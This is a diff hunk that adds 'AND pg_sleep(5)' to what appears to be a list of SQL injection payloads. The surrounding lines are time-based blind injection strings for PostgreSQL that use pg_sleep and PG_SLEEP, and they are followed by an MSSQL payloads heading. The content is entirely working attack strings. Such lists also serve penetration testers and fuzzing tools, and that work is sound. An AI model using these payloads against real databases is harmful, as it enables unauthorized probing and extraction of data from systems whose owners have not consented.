@@ -63,6 +63,7 @@ pg_SLEEP(5)#
 pg_SLEEP(5)--
 ') OR 11=(SELECT 11 FROM PG_SLEEP(6))--
 ');(SELECT 4564 FROM PG_SLEEP(5))--
+AND pg_sleep(5)
 
 ##MSSQL Payloads
 
